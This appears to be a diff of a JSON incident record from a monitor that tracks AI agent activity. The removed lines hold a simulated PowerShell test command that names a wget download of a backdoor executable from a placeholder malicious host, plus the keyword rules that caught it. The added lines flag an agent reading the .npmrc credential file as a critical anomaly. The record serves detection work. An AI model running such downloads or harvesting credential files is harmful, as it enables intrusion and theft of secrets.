@@ -1,25 +1,53 @@
 {
     "incident_id": "INC-0007",
+    "incident_type": "TOOL_ANOMALY",
     "ai_event": {
-        "agent": "Background Script/AI",
-        "action": "terminal",
-        "timestamp": "2026-06-18T16:43:27.9007751Z"
-    },
-    "sysmon_event": {
-        "EventID": 1,
-        "TimestampUTC": "2026-06-18T16:43:27.9007751Z",
-        "ProcessId": "10224",
-        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "CommandLine": "powershell.exe  -Command \"Write-Host \"[ATTACK] wget http://malicious.site/backdoor.exe\"\"",
-        "ParentProcessId": "28188",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ai_event_id": "TOOL-1782403843640",
+        "event_type": "tool_invocation",
+        "agent": "Claude Code",
+        "action": "tool_invocation",
+        "tool": "file_read",
+        "timestamp": "2026-06-25T16:10:43.640467+00:00",
+        "raw_command": "",
+        "session_id": "session-613ba7be",
+        "user": "",
+        "tool_type": "file_read",
+        "target": ".npmrc",
+        "parameters": {},
+        "tool_analysis": {
+            "has_anomaly": true,
+            "risk_score": 65,
+            "risk_level": "CRITICAL",
+            "anomalies": [
+                {
+                    "type": "SENSITIVE_FILE_ACCESS",
+                    "detail": ".npmrc (matched: .npmrc)"
+                },
+                {
+                    "type": "MASS_FILE_ENUMERATION",
+                    "detail": "7 files/10s"
+                }
+            ],
+            "analyzed_at": "2026-06-25T16:10:43.640762+00:00"
+        },
         "_correlated": true
     },
-    "severity": "CRITICAL",
-    "matched_rules": [
-        "Suspicious Keyword: wget",
-        "Suspicious Keyword: http",
-        "Process: PowerShell",
-        "Network: Outbound Comm"
-    ]
+    "sysmon_event": {},
+    "tool_analysis": {
+        "has_anomaly": true,
+        "risk_score": 65,
+        "risk_level": "CRITICAL",
+        "anomalies": [
+            {
+                "type": "SENSITIVE_FILE_ACCESS",
+                "detail": ".npmrc (matched: .npmrc)"
+            },
+            {
+                "type": "MASS_FILE_ENUMERATION",
+                "detail": "7 files/10s"
+            }
+        ],
+        "analyzed_at": "2026-06-25T16:10:43.640762+00:00"
+    },
+    "severity": "CRITICAL"
 }
